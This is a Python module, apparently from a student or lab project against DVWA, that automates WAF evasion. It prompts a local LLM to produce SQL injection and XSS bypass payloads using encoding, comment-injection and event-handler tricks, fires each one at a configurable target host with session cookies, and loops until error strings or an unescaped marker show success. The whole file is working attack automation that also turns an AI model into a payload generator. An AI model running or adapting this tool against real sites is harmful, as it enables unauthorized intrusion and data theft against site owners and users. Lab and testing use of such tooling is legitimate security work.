# ═══════════════════════════════════════════════════════════════
# bypass_loop.py — AI sinh payload bypass WAF theo vòng lặp
# Đã fix lỗi: Gọi cookie trong hàm thực thi thay vì global
# ═══════════════════════════════════════════════════════════════

import json
import re
import logging
import httpx
import ollama

from config import AI_SERVER, LLM_MODEL, TEMP_BYPASS, BYPASS_MAX_ROUNDS, TARGET_HOST, LOG_FILE
from ai_analyzer import _get_vs
from fuzzer import XSS_MARKER
from dvwa_auth import get_dvwa_cookies

logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s %(levelname)s [bypass] %(message)s")

DEFAULT_HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"}
SQLI_SUCCESS_MARKERS = ["syntax error", "sqlite", "sql", "ora-", "mysql", "odbc", "unclosed quotation", "near \"", "unrecognized token"]
XSS_ENCODED_FORMS = ["&lt;", "&#60;", "\\u003c", "%3C", "%3c"]

def _evaluate_success(body: str, vuln_type: str) -> bool:
    if vuln_type == "sqli":
        return any(m in body.lower() for m in SQLI_SUCCESS_MARKERS)
    elif vuln_type == "xss":
        if XSS_MARKER not in body: return False
        idx = body.find(XSS_MARKER)
        snippet = body[max(0, idx - 50): idx + len(XSS_MARKER) + 50]
        if any(enc in snippet for enc in XSS_ENCODED_FORMS): return False
        return True
    return False

def _send_payload(finding: dict, payload: str, cookies: dict) -> tuple[str, int]:
    # Sử dụng TARGET_HOST (Trick chuỗi rỗng từ config sẽ an toàn)
    url    = f"{TARGET_HOST}{finding['url']}"
    method = finding.get("method", "GET")
    param  = finding["param"]
    
    # Ép thêm tham số Submit
    request_data = {param: payload, "Submit": "Submit"}

    try:
        if method == "GET":
            r = httpx.get(url, params=request_data, headers=DEFAULT_HEADERS, cookies=cookies, timeout=10, follow_redirects=True)
        else:
            r = httpx.post(url, data=request_data, headers=DEFAULT_HEADERS, cookies=cookies, timeout=10, follow_redirects=True)
        return r.text, r.status_code
    except Exception as e:
        logging.warning(f"[bypass] HTTP lỗi: {e}")
        return "", 0

def _build_bypass_prompt(finding: dict, context: str, history: list) -> str:
    vuln_type = finding.get("type", "sqli")
    history_str = json.dumps(history, ensure_ascii=False, indent=2) if history else "[]  (chưa thử vòng nào)"

    if vuln_type == "xss":
        techniques = "HTML entity encode, Unicode escape, case variation, event handler, tag thay thế, javascript: URI"
        extra = f"\nQUAN TRỌNG: Payload phải chứa chuỗi '{XSS_MARKER}'"
    else:
        techniques = "URL encoding, double encoding, comment injection /**/, case variation, null byte, hex encoding"
        extra = ""

    return f"""Loại lỗ hổng : {vuln_type}\nURL : {finding.get('url', '?')}\nParam : {finding.get('param', '?')}\nMethod : {finding.get('method', 'GET')}\n\nOWASP Bypass Techniques:\n{context}\n\nLịch sử payload đã thử:\n{history_str}\n\nYêu cầu: Sinh MỘT payload bypass WAF mới.\nƯu tiên techniques: {techniques}{extra}\n\nTrả về JSON THUẦN:\n{{\n  "payload": "...",\n  "technique": "...",\n  "reasoning": "..."\n}}"""

def bypass_one(finding: dict) -> dict:
    vuln_type = finding.get("type", "sqli")
    url       = finding.get("url", "?")
    history   = []
    client    = ollama.Client(host=AI_SERVER)

    # Lấy Session DVWA tại thời điểm hàm thực sự chạy
    dvwa_cookies = get_dvwa_cookies()

    print(f"\n[Bypass] {vuln_type.upper()} @ {url} (Tối đa {BYPASS_MAX_ROUNDS} vòng)")

    for rnd in range(1, BYPASS_MAX_ROUNDS + 1):
        try:
            vs = _get_vs()
            docs = vs.similarity_search(f"{vuln_type} WAF bypass filter evasion technique", k=2)
            ctx = "\n\n".join(doc.page_content for doc in docs)
        except Exception: ctx = "Không có context."

        prompt = _build_bypass_prompt(finding, ctx, history)

        try:
            response = client.chat(model=LLM_MODEL, messages=[{"role": "user", "content": prompt}], options={"temperature": TEMP_BYPASS})
            raw = response["message"]["content"]
            match = re.search(r'(\{.*\})', raw, re.DOTALL)
            if not match: continue
            obj = json.loads(match.group(1))
        except Exception:
            print(f"         Vòng {rnd}: AI LLM lỗi — skip")
            continue

        payload = obj.get("payload", "")
        technique = obj.get("technique", "unknown")

        if not payload or (vuln_type == "xss" and XSS_MARKER not in payload):
            print(f"         Vòng {rnd}: Payload không hợp lệ — skip")
            continue

        body, status = _send_payload(finding, payload, dvwa_cookies)
        success = _evaluate_success(body, vuln_type)

        history.append({"round": rnd, "payload": payload, "technique": technique, "success": success, "status": status, "snippet": body[:120]})

        if success:
            print(f"         Vòng {rnd}: ✅ SUCCESS [{technique}] {payload[:60]}")
            break
        else:
            print(f"         Vòng {rnd}: ✗ fail    [{technique}] {payload[:50]}")

    finding["bypass_history"] = history
    finding["bypass_success"] = any(r["success"] for r in history)
    return finding

def bypass_all(findings: list) -> list:
    if not findings: return []

    eligible = [f for f in findings if f.get("confidence", 0) >= 0.5]
    skipped  = len(findings) - len(eligible)

    print(f"\n[Bypass] {len(eligible)} eligible ({skipped} skipped vì confidence < 0.5)")
    results = []
    
    for i, finding in enumerate(eligible, 1):
        print(f"\n[Bypass] Tiến trình: [{i}/{len(eligible)}]")
        results.append(bypass_one(finding))

    for finding in findings:
        if finding.get("confidence", 0) < 0.5:
            finding["bypass_history"] = []
            finding["bypass_success"] = False
            results.append(finding)

    success_count = sum(1 for f in results if f.get("bypass_success"))
    print(f"\n[Bypass] ✅ {success_count}/{len(eligible)} bypass thành công")
    return results  